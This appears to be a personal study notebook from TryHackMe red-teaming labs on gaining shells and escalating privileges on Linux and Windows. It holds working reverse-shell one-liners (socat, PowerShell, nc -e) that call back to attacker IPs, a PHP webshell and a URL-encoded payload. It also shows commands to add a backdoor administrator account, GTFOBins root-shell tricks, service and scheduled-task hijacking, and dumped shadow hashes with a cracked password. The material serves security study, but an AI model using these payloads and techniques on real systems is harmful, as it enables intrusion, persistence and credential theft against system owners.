#RedTeaming #tryhackme
#### Shells:

If we get a shell on the target, our next goal should be to escalate our privileges such that we have a more reliable way of connecting to the target. This could be a "better" shell, or ideally a normal user on the target systems such that we can get a native shell. 


**Reverse:** Target connect back to us 
- Note when we connect via a reverse shell over the internet we need to configure our network to accept the shell. 
- Hot tips: Have the listening port be a common one such as 80, 443, 53 etc. since this makes the connection less likely to get stopped by firewalls. 


**Bind:** A port is open on the target, and we can connect to the target via it.
- Note firewalls on the target may stop the bind port

Resources to gain shells:
- Netcat / socat 
- Metasploit --multi/handler
- Msfvenom
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- /usr/share/webshells in kali 

**Interactive vs non-interactive shells:**
- Interactive shells lets us interact with programs after executing them, ex. SSH requering us to verify the fingerprint.
- Non-interactive shells restrict us to the programs that do not require interactions to run properly. 

**Make shells stabile:**
- Common problem that our (bind/reverse)shells do not have autocomplete, interactivity and loses connection when we type CTRL+C.  


- can use rlwrap with netcat: 
```
rlwrap nc -lvnp <port>
```

#### Socat:
**Reverse shell:**
```
Listening: socat TCP-L:<port> -
On target:

(Windows): socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

(Linux): socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

**Bind shell:**
```
On target listening:  
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

On host connecting to target:
socat TCP:<TARGET-IP>:<TARGET-PORT> -

```


#### Encrypted shells:
- Usefull since it hides the communication between us and the target, can help with bypassing IDS. 
``` bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

cat shell.key shell.crt > shell.pem

Then we can get the encrypted reverse shell listener:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -


Connecting back from the target:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Encrypted tty listening: (tty just make the shell more stabil)
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

Corresponding code for the target to connect back to the listener
```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


#### Other shellcodes
For windows targets, insane reverse shell code:
``` PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

More on shells: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/


**Staged**  payloads are sent in two parts. The first part is called the _stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  

**Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

##### msfvenom 
ref: [[Metasploit]]

```
Full example:
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443 


General format of payloads: <OS>/<arch>/<payload>
ex: linux/x86/shell_reverse_tcp

Staged: linux/x86/meterpreter/reverse_tcp
Stageless: linux/x86/meterpreter_reverse_tcp

Seach for payloads:
msfvenom --list payloads | grep <filter for os, arch etc.>
```


#### Case problem:

- We are given a webserver vulnerable to file inclusion. 
- We start off by uploading a light php webshell:
```PHP
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Then we can execute commands via the url:
```
http://10.10.222.18/uploads/webshell.php?cmd=ifconfig
```

- NOTICE we have to navigate to the webshell.php then send in a command. 

Okey, this is nice, but we want a better shell, since this just runs in the browser. -> We can make the shell do a nc connection to our local listener, but this is still a unstable shell:
```
http://10.10.222.18/uploads/webshell.php?cmd=nc%2010.10.210.222%204444%20-e%20%2Fbin%2Fbash
```

We upload a better shell and execure it via the webshell:
- We upload a php reverse shell: `/usr/share/webshells/php/php-reverse-shell.php`

Then maybe we managed to get some credential files, and manage to ssh into the machine. 

#### Case problem (windows target):

- We have the same file upload vulnerability. So we try upload a php webshell, and it works. (same default php shell)
- Now we want to use the ps1 super payload, we just need to url encode it:

```powershell 
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.123.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

We use burp to url encode (the online tool was a bit messy, did not work?), so the payload it:
```
%70%6f%77%65%72%73%68%65%6c%6c%20%2d%63%20%22%24%63%6c%69%65%6e%74%20%3d%20%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%27%31%30%2e%31%31%2e%31%32%33%2e%31%32%38%27%2c%34%34%34%34%29%3b%24%73%74%72%65%61%6d%20%3d%20%24%63%6c%69%65%6e%74%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%79%74%65%73%20%3d%20%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%20%3d%20%24%73%74%72%65%61%6d%2e%52%65%61%64%28%24%62%79%74%65%73%2c%20%30%2c%20%24%62%79%74%65%73%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%61%74%61%20%3d%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%2d%54%79%70%65%4e%61%6d%65%20%53%79%73%74%65%6d%2e%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%79%74%65%73%2c%30%2c%20%24%69%29%3b%24%73%65%6e%64%62%61%63%6b%20%3d%20%28%69%65%78%20%24%64%61%74%61%20%32%3e%26%31%20%7c%20%4f%75%74%2d%53%74%72%69%6e%67%20%29%3b%24%73%65%6e%64%62%61%63%6b%32%20%3d%20%24%73%65%6e%64%62%61%63%6b%20%2b%20%27%50%53%20%27%20%2b%20%28%70%77%64%29%2e%50%61%74%68%20%2b%20%27%3e%20%27%3b%24%73%65%6e%64%62%79%74%65%20%3d%20%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%24%73%65%6e%64%62%61%63%6b%32%29%3b%24%73%74%72%65%61%6d%2e%57%72%69%74%65%28%24%73%65%6e%64%62%79%74%65%2c%30%2c%24%73%65%6e%64%62%79%74%65%2e%4c%65%6e%67%74%68%29%3b%24%73%74%72%65%61%6d%2e%46%6c%75%73%68%28%29%7d%3b%24%63%6c%69%65%6e%74%2e%43%6c%6f%73%65%28%29%22
```

- Now that we have a ps, we can make a new user with admin privs:
```
net user backdoor P@ssw0rd123 /add
```

```
net localgroup Administrators backdoor /add
```

- Verify we have made it correctly:
```
net user backdoor
```

- Connecting to the new user we added via RDP:
```
xfreerdp /u:backdoor /p:P@ssw0rd123 /v:10.10.140.254
```

##### We can also inject a msfvenom payload to get a meterpeter shell:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o shell.exe LHOST=10.11.123.128 LPORT=4444
```

- We execute the shell.exe with out webshell on the target, and setup a listener with msfconsole:
```
use multi/handler

set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST ...
set LPORT ...

Then we run the listener:
exploit
```



### Privsec on Linux:
Automatic tools/scripts to enumerate:
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
https://github.com/rebootuser/LinEnum
https://github.com/The-Z-Labs/linux-exploit-suggester
https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/linted/linuxprivchecker

Kernal exploits to gain privileges:
``` TIPS AND HELP
1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
```

NOTE: When transfeering payload to a linux machine, may folder do not allow us to write no files, hence we cannot upload any files. BUT, the /tmp folder has the sticky bit and allows up to write files but not modify. 

Example of uploading payload, running it and gaining root. 
![[Pasted image 20250129182805.png]]


#### PrivEsc commands with "sudo permission":

**SUID, SGID, sticky bit**
![[Pasted image 20250208134258.png]]



Some doc: https://gtfobins.github.io/ 

TIPS: Good practise to check the files/program that have the s'bit set: 
```
find / -type f -perm -04000 -ls 2>/dev/null
``` 

then compare it against the doc. 

Example: I want to read the /etc/shadows file, but i dont have permission with my user. 
- I see that /usr/bin/base64 command has the s'bit, and find an exploit in the doc. 
- I follow the guide, and can read the file:
![[Pasted image 20250129192046.png]]

NOTE: when a program has the s bit set, it means that the program will run with root privilege

- Some users have sudo premissions on some commands, we can leverage.

**Basic tactics for privilege escalation - if we have sudo access to a text editor:**
- Reading and cracking the `/etc/shadow` file or adding a new user to the `/etc/passwd` file which have permission to run a root shell. 

**Another Example:**

- We have sudo premissions for the less command. 
- We read the doc and see that:
```
sudo less /etc/profile
!/bin/sh
```

- That is, once we go into the "less shell" we run the last command to get root shell. 

#### PrivEsc commands with "capabilities":
- The s bit might not be set, but a command could have sudo premissions to run a command via capabilities. We can list a users capabilities:
```
getcap -r / 2>/dev/null
```

- Then as before, look in the doc if there is any known way to exploit this 

#### PrivEsc with Cron jobs

- In the /etc/crontab we can see all commands that is scheduled to be executed. 
- Some of these commands has root privilege, so the idea is to inject our own code into the files ("everything in linux is a file")  of the commands. 

In general 2 ideas to do this:
- there is a cron-job active, but the file do not exist. So we just make the file with our code.
- There is a cron-job with a associated file which we have write permission to, so we can change the content. 

NOTE: The file which is to be executed need to have execute permission. 

#### PrivEsc with PATH:
- The Idea: Look for folders in PATH where the user has write premissions to. Can find this with:
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

echo $PATH
```

- Then we can make a file with out shellcode. And get another program with the s bit to execute our  file. 
- Our file needs to be within one of the folders in PATH, since this where executable files for our user are located.  

#### PrivEsc with misconfigure of NFS file:

- Idea: We are allowed to mount a folder on the target with our own local folder, and that way upload a malicious file that has s bit. 

Example:
![[Pasted image 20250130105746.png]]

We can observe 3 files is mountable without root (no_root_squash). So we mount (map) one of them to our own machine. 

Can also show mountable shares from attacking machine:
```
showmount -e <target_ip>
```

Do the mounting:
```
sudo mount -o rw <target_ip>:<target_mount_folder> <local_file_we_map>
```

Then we can write some code that can be executed, and ensure that this file has the s bit:
![[Pasted image 20250130110148.png]]

- The nfs file is now on the target machine, with the s bit and owned by root. So we can run it and gain an root shell. 

#### Capstone challenge:

**uname -a:**
```

[missy@ip-10-10-33-93 Documents]$ uname -a
Linux ip-10-10-33-93 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Might be an exploit for this:
- https://github.com/briskets/CVE-2021-3493


**id:** `uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`

**sudo -l:** 
`Sorry, user leonard may not run sudo on ip-10-10-33-93`

Missy sudo -l:
![[Pasted image 20250130120347.png]]

- we can run find with sudo, we do this and discover the first flag: ![[Pasted image 20250130120555.png]]
- This file can missy read, so we got the first flag.
- We also find out that the second flag is located in:
`/home/rootflag/flag2.txt`

Messed up my box, and it had persistency, so i cannot log back onto any of the users. But we can use the fact that Missy has sudo privs with the 'find' command. Read from the doc that we can get a root shell by:
```
find . -exec /bin/sh \; -quit
```




- Can read /etc/passwd, but not /etc/shadow
**Users on the target,** we can run: `cat /etc/passwd | cut -d ":" -f 1`

``` USERS
root
bin
daemon
adm
lp
sync
shutdown
halt
mail
operator
games
ftp
nobody
pegasus
systemd-network
dbus
polkitd
colord
unbound
libstoragemgmt
saslauth
rpc
gluster
abrt
postfix
setroubleshoot
rtkit
pulse
radvd
chrony
saned
apache
qemu
ntp
tss
sssd
usbmuxd
geoclue
gdm
rpcuser
nfsnobody
gnome-initial-setup
pcp
sshd
avahi
oprofile
tcpdump
leonard
mailnull
smmsp
nscd
missy
```


**Files with s bits:**
```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
[leonard@ip-10-10-33-93 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
```
- SUID: base64 has s bit set. 

Exploit that:
```
[leonard@ip-10-10-33-93 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

**Cracked creds:**
```
missy : Password1
```

- PATH:
```
leonard@ip-10-10-33-93 ~]$ echo $PATH
/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
```

- Capabilities:
```
Non of leonard, missy has any capabilities.
```

- No Cron-jobs for missy or leonard:
![[Pasted image 20250130120025.png]]


### PrivEsc on Windows:
Weaknesses we could work with:
- Misconfig on windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches 

In addition to administrator and standard user accounts on a windows system we also have special user types:
![[Pasted image 20250131085543.png]]


#### PrivEsc enumeration on windows:

Check powershell history:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

ISS Configuration:
ISS is the default web server on windows installations. We can check its config file, web.config, for stored passwords of databases or other stuff:

location of the file. 
```
C:\inetpub\wwwroot\web.config

or

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```


View other users credentials:
```
cmdkey /list


runas /savecred /user:<username> cmd.exe
```

Check PuTTY for saved proxy credentials:
```

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s


NOTE: We always use SimonTatham in the path
```


Cheap schedule task trick:

Can use `schtasks` command in cmd to list all schedual tasks. 

![[Pasted image 20250131095433.png]]


We want to find a task that executes as another users and which our user can make modifications to(write permissions to the file that gets executed etc)

![[Pasted image 20250131095442.png]]

Then we can write a reverse shell or some other code to the file that gets executed:

![[Pasted image 20250131095520.png]]

Bom! Then we have a rev shell with the permissions of the user that is "running the file", in this case taskusr1. 

Note: that in a real scenario we would have to wait before the scheduled task is executed for this to work. 

#### PrivEsc with service control manager 
SCM manages the services state of the services on the system. 

A service has an assosiaded executable which it will run. The idea is to find a service with a executable we have write premissions for, and change it to our payload. 

Can look at services with CMD using:
`sc qc <servicename>`

![[Pasted image 20250131131938.png]]

- This service will run as svcuser1, so by "taking over" this service, we can get his permissions. 


Then look at the executable:
![[Pasted image 20250131131802.png]]

- Can spot: Everyone can modify, so we modify
![[Pasted image 20250131132050.png]]

- Then the service need to execute, and we get a reverse shell. 

**Another option:** A service is running a executable which has spaces in its filepath:
![[Pasted image 20250131134904.png]]

The service execute the following:
![[Pasted image 20250131134923.png]]

So if we have write permissions to the c:\MyPrograms folder, we can make a new disk.exe file with our payload. 

**Another option:**
We can change the config of the sevices:
![[Pasted image 20250131145054.png]]

Example: BUILTIN\Users has SERIVCE_ALL_ACCESS, so any user can reconfigure the service thmservice. 

Again we can set a new executable, and also we can change the "owner of the service: Here we change it to system. 
```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Then, same as before we just need to wait for the service to execute or execute it ourself if we have that option. 


#### PrivEsc with windows privilege constants:
Some users have premission to use some "privilege constants" even though they are not admin. 
Doc: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

If our user have access to one, there might be a way to exploit it.
https://github.com/gtworek/Priv2Admin

check our privilege by: `whoami /priv`

#### PrivEsc with vulnerable software:
There might be vulnerable software running on the target, due to it being old etc. 

We can check the list of installed software, version and vendor:
```
wmic product get name,version,vendor
```

NOTE: its not 100% to show all software, so one might need to do some digging manually. 

Then one would need to lookup the software with version on exploit.db or google etc to check for exploits. 

#### Tools to automate enumeration on windows:
- `multi/recon/local_exploit_suggester`
- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- https://github.com/itm4n/PrivescCheck
- https://github.com/bitsadmin/wesng





